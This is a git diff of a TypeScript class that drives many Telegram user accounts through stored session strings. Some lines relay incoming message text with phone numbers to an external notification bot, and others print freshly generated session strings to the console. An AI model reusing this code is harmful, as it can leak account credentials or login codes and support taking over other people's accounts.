@@ -14,7 +14,6 @@ import { contains } from '../../utils';
 import { parseError } from '../../utils/parseError';
 import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
 import { notifbot } from '../../utils/logbots';
-import { ContentFilter } from '../../interfaces/telegram';
 import {
     GroupOptions
 } from '../../interfaces/telegram';
@@ -42,15 +41,11 @@ class TelegramManager {
     public client: TelegramClient | null;
     private channelArray: string[];
     private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };
-    private contentFilters: Map<string, ContentFilter>;
-    private filterHandler: any;
-
     constructor(sessionString: string, phoneNumber: string) {
         this.session = new StringSession(sessionString);
         this.phoneNumber = phoneNumber;
         this.client = null;
         this.channelArray = [];
-        this.contentFilters = new Map();
     }
 
     public static getActiveClientSetup() {
@@ -110,8 +105,8 @@ class TelegramManager {
     }
 
     private async createOrJoinChannel(channel: string) {
-        let channelId;
-        let channelAccessHash;
+        let channelId: bigInt.BigInteger;
+        let channelAccessHash: bigInt.BigInteger;
         if (channel) {
             try {
                 const result: any = await this.joinChannel(channel);
@@ -305,46 +300,26 @@ class TelegramManager {
         return forwardedCount;
     }
 
-    async disconnect(): Promise<void> {
+    async destroy(): Promise<void> {
         if (this.client) {
             try {
-                console.log("Destroying Client: ", this.phoneNumber);
-                await this.cleanupClient();
-                console.log("Client Destroyed finally: ", this.phoneNumber);
-            } catch (error) {
-                console.error("Error during disconnect:", error);
-                throw error;
-            }
-        }
-    }
-
-    private async cleanupClient() {
-        try {
-            if (!this.client) return;
-            const handlers = this.client.listEventHandlers();
-            for (const handler of handlers) {
-                this.client.removeEventHandler(handler[1], handler[0]);
-            }
-            console.debug("Removing all handlers");
-            try {
-                if (this.client.connected) {
-                    await this.client.disconnect();
-                }
-                await this.client.destroy();
-                console.debug("Client destroyed");
+                await this.client?.destroy();
+                this.client._eventBuilders = [];
+                this.session?.delete();
+                this.channelArray = [];
+                await sleep(2000);
+                console.log("Client Destroyed: ", this.phoneNumber);
             } catch (error) {
                 parseError(error, `${this.phoneNumber}: Error during client cleanup`);
+            } finally {
+                if (this.client) {
+                    this.client._destroyed = true;
+                    if (this.client._sender && typeof this.client._sender.disconnect === 'function') {
+                        await this.client._sender.disconnect();
+                    }
+                    this.client = null;
+                }
             }
-            await this.client.destroy();
-            await this.client.disconnect();
-            this.client = null;
-            this.session.delete();
-            this.channelArray = [];
-            this.client = null;
-            await sleep(2000);
-            console.log("Client Destroyed: ", this.phoneNumber);
-        } catch (error) {
-            parseError(error, `${this.phoneNumber}: Error during client cleanup`);
         }
     }
 
@@ -360,15 +335,14 @@ class TelegramManager {
     }
 
     async errorHandler(error) {
-        parseError(error)
         if (error.message && error.message == 'TIMEOUT') {
             // await this.client.disconnect();
-            // await this.client.destroy();
+            await this.destroy();
             // await disconnectAll()
             //Do nothing, as this error does not make sense to appear while keeping the client disconnected
         } else {
-            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);
-            // Handle other types of errors
+            // console.error(`Error occurred: ${this.phoneNumber}:`, error);
+            parseError(error)
         }
     }
 
@@ -377,7 +351,7 @@ class TelegramManager {
             connectionRetries: 5,
         });
         this.client.setLogLevel(LogLevel.ERROR);
-        // this.client._errorHandler = this.errorHandler
+        this.client._errorHandler = this.errorHandler
         await this.client.connect();
         const me = <Api.User>await this.client.getMe();
         console.log("Connected Client : ", me.phone);
@@ -458,17 +432,6 @@ class TelegramManager {
         const chats = await this.client.getDialogs(params);
         console.log("TotalChats:", chats.total);
         return chats;
-    }
-
-    async getLastMsgs(limit: number): Promise<string> {
-        if (!this.client) throw new Error('Client is not initialized');
-        const msgs = await this.client.getMessages("777000", { limit });
-        let resp = '';
-        msgs.forEach((msg) => {
-            console.log(msg.text);
-            resp += msg.text + "\n";
-        });
-        return resp;
     }
 
     async getSelfMSgsInfo(): Promise<{
@@ -633,11 +596,22 @@ class TelegramManager {
                 if (chats.length > 1) {
                     await sleep(3000);
                 }
-
             } catch (error) {
-                const errorDetails = parseError(error);
-                console.log(`${this.phoneNumber} Failed to leave channel :`, errorDetails.message);
-                break;
+                const errorDetails = parseError(error, `${this.phoneNumber} Failed to leave channel  ${id}:`);
+                if (errorDetails.message.includes('CHANNEL_INVALID')) {
+                    try {
+                        const entity = await this.client.getInputEntity(id);
+                        await this.client.invoke(
+                            new Api.channels.LeaveChannel({
+                                channel: entity
+                            })
+                        );
+                    } catch (err) {
+                        console.warn(`${this.phoneNumber} Cannot fetch entity for: ${id}, likely not a member or invalid`);
+                        continue;
+                    }
+
+                }
             }
         }
         console.log(`${this.phoneNumber} Leaving Channels: Completed!!`);
@@ -953,7 +927,7 @@ class TelegramManager {
                 //         parseError(error)
                 //     }
                 // } else {
-                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(event.message.text)}`);
+                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\n${event.message.text}`)}`);
                 // await event.message.delete({ revoke: true });
                 // }
             }
@@ -1286,6 +1260,7 @@ class TelegramManager {
         let newUserName = ''
         let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
         let increment = 0;
+
         if (username === '') {
             try {
                 await this.client.invoke(new Api.account.UpdateUsername({ username }));
@@ -1306,7 +1281,13 @@ class TelegramManager {
                         newUserName = username
                         break;
                     } else {
-                        username = baseUsername + increment;
+                        // Use only 2 numbers, no alphabets, for last 4 attempts (6, 7, 8, 9)
+                        if (increment >= 6) {
+                            const randomNums = Math.floor(Math.random() * 90 + 10); // 2 digit number
+                            username = baseUsername + randomNums;
+                        } else {
+                            username = baseUsername + increment;
+                        }
                         increment++;
                         await sleep(2000);
                     }
@@ -1316,7 +1297,13 @@ class TelegramManager {
                         newUserName = username;
                         break;
                     }
-                    username = baseUsername + increment;
+                    // Use random characters for last 4 attempts (6, 7, 8, 9)
+                    if (increment >= 6) {
+                        const randomChars = Math.random().toString(36).substring(2, 6);
+                        username = baseUsername + randomChars;
+                    } else {
+                        username = baseUsername + increment;
+                    }
                     increment++;
                     await sleep(2000);
                 }
@@ -1595,8 +1582,8 @@ class TelegramManager {
 
         });
         const session = <string><unknown>newClient.session.save();
-        await newClient.disconnect();
-        // await newClient.destroy();
+        // await newClient.disconnect();
+        await newClient.destroy();
         console.log("New Session: ", session)
         return session
     }
@@ -2048,79 +2035,6 @@ class TelegramManager {
         }
     }
 
-    async setContentFilters(filters: ContentFilter) {
-        if (!this.client) throw new Error('Client not initialized');
-
-        this.contentFilters.set(filters.chatId, filters);
-
-        if (!this.filterHandler) {
-            this.filterHandler = this.client.addEventHandler(async (event) => {
-                if (event instanceof NewMessageEvent) {
-                    const message = event.message;
-                    const chatId = message.chatId?.toString();
-                    const filter = this.contentFilters.get(chatId);
-
-                    if (!filter) return;
-
-                    const shouldFilter = await this.evaluateMessage(message, filter);
-                    if (shouldFilter) {
-                        for (const action of filter.actions) {
-                            await this.executeFilterAction(action, message);
-                        }
-                    }
-                }
-            }, new NewMessage({}));
-        }
-    }
-
-    private async evaluateMessage(message: Api.Message, filter: ContentFilter): Promise<boolean> {
-        if (filter.keywords?.length) {
-            const messageText = message.message.toLowerCase();
-            if (filter.keywords.some(keyword => messageText.includes(keyword.toLowerCase()))) {
-                return true;
-            }
-        }
-
-        if (filter.mediaTypes?.length && message.media) {
-            const mediaType = this.getMediaType(message.media);
-            if (filter.mediaTypes.includes(mediaType)) {
-                return true;
-            }
-        }
-
-        return false;
-    }
-
-    private async executeFilterAction(action: 'delete' | 'warn' | 'mute', message: Api.Message) {
-        try {
-            switch (action) {
-                case 'delete':
-                    await this.client.deleteMessages(message.chatId, [message.id], { revoke: true });
-                    break;
-                case 'warn':
-                    await this.client.sendMessage(message.chatId, {
-                        message: `⚠️ Message filtered due to content policy.`,
-                        replyTo: message.id
-                    });
-                    break;
-                case 'mute':
-                    if (message.fromId) {
-                        await this.client.invoke(new Api.channels.EditBanned({
-                            channel: message.chatId,
-                            participant: message.fromId,
-                            bannedRights: new Api.ChatBannedRights({
-                                untilDate: Math.floor(Date.now() / 1000) + 3600,
-                                sendMessages: true
-                            })
-                        }));
-                    }
-                    break;
-            }
-        } catch (error) {
-            console.error(`Failed to execute filter action ${action}:`, error);
-        }
-    }
-
     private getSearchFilter(filter: string): Api.TypeMessagesFilter {
         switch (filter) {
             case 'photo': return new Api.InputMessagesFilterPhotos();
@@ -2422,20 +2336,41 @@ class TelegramManager {
                 filter: filter,
                 ...queryFilter,
                 hash: bigInt(0),
-                fromId: undefined
             }
+            let messages = [];
+            let count = 0;
+            console.log("Search Query: ", searchQuery);
             if (chatId) {
                 searchQuery['peer'] = await this.safeGetEntity(chatId);
-            }
-            const result = await this.client.invoke(
-                new Api.messages.Search(searchQuery)
-            );
+                console.log("Performing search in chat: ", chatId);
+                const result = await this.client.invoke(
+                    new Api.messages.Search(searchQuery)
+                );
 
-            if (!('messages' in result)) {
-                return {};
+                if (!('messages' in result)) {
+                    return {};
+                }
+                console.log(type, result?.messages?.length, result["count"]);
+                count = result["count"] || 0;
+                messages = result.messages as Api.Message[];
+            } else {
+                console.log("Performing global search");
+                const result = await this.client.invoke(
+                    new Api.messages.SearchGlobal({
+                        ...searchQuery,
+                        offsetRate: 0,
+                        offsetPeer: new Api.InputPeerEmpty(),
+                        offsetId: 0,
+                        usersOnly: true
+                    })
+                );
+                if (!('messages' in result)) {
+                    return {};
+                }
+                console.log(type, result?.messages?.length, result["count"]);
+                count = result["count"] || 0;
+                messages = result.messages as Api.Message[];
             }
-            let messages = result.messages;
-            console.log(type, result.messages.length, result["count"]);
             if (types.includes(MessageMediaType.TEXT) && types.length === 1) {
                 console.log("Text Filter");
                 messages = messages.filter((msg: Api.Message) => !('media' in msg));
@@ -2444,11 +2379,11 @@ class TelegramManager {
                 const unwantedTexts = [
                     'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',
                     'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',
-                    'invite link', 'invitation', 'invitation link', 'customers', 'confirmation','earn', 'book', 'paper', 'pay',
-                    'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray', 
+                    'invite link', 'invitation', 'invitation link', 'customers', 'confirmation', 'earn', 'book', 'paper', 'pay',
+                    'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray',
                     'mdisk', 'diskwala', 'tera', 'online', 'watch', 'click', 'episode', 'season', 'part', 'action',
                     'adventure', 'comedy', 'drama', 'fantasy', 'horror', 'mystery', 'romance', 'sci-fi', 'thriller',
-                    'demo', 'dress', 'netlify','service', 'follow', 'like', 'comment', 'share', 'subscribe',
+                    'demo', 'dress', 'netlify', 'service', 'follow', 'like', 'comment', 'share', 'subscribe',
                     'premium', 'premium', 'unlock', 'access', 'exclusive', 'limited', 'offer', 'deal',
                     'discount', 'sale', 'free trial', 'free access', 'free download', 'free gift', 'freebie',
                     'crypto', 'currency', 'coin', 'blockchain', 'wallet', 'exchange', 'trading', 'investment',
@@ -2470,7 +2405,7 @@ class TelegramManager {
             const filteredMessages = processedMessages.filter(id => id !== null);
             const localResult = {
                 messages: filteredMessages,
-                total: result["count"] ? result['count'] : filteredMessages.length
+                total: count ? count : filteredMessages.length
             }
             finalResult[`${type}`] = localResult;
         }
